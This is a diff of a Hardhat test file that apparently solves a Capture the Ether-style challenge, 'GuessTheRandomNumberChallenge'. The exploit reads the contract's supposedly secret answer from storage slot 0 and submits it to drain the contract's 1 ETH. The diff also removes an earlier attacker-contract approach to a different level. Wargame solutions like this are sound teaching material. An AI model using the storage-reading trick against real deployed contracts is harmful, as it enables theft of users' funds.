@@ -1,10 +1,13 @@
+import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
 import { ethers, network } from 'hardhat';
 const { utils, provider } = ethers;
 
-describe('GuessTheNewNumberChallenge', () => {
+describe('GuessTheRandomNumberChallenge', () => {
   let target: Contract;
+  let owner: SignerWithAddress;
+  let attacker: SignerWithAddress;
 
   before(async () => {
     await network.provider.request({
@@ -12,28 +15,26 @@ describe('GuessTheNewNumberChallenge', () => {
       params: [],
     });
 
-    const targetFactory = await ethers.getContractFactory('GuessTheNewNumberChallenge');
+    [owner, attacker] = await ethers.getSigners();
+
+    const targetFactory = await ethers.getContractFactory('GuessTheRandomNumberChallenge');
     target = await targetFactory.deploy({
       value: utils.parseEther('1'),
     });
     await target.deployed();
+
     console.log('Target deployed to:', target.address);
   });
 
   it('Exploit', async () => {
-    const attackerFactory = await ethers.getContractFactory('GuessTheNewNumberChallengeAttacker');
-    const attacker = await attackerFactory.deploy(target.address);
-    await attacker.deployed();
-    console.log('attacker deployed on', attacker.address);
-
-    console.log('Attacking');
-    const tx = await attacker.attack({
+    const answer = await provider.getStorageAt(target.address, 0);
+    const tx = await target.guess(answer, {
       value: utils.parseEther('1'),
     });
     await tx.wait();
   });
 
   after(async () => {
-    expect(await provider.getBalance(target.address)).to.equal(0);
+    expect(await target.isComplete()).to.equal(true);
   });
 });
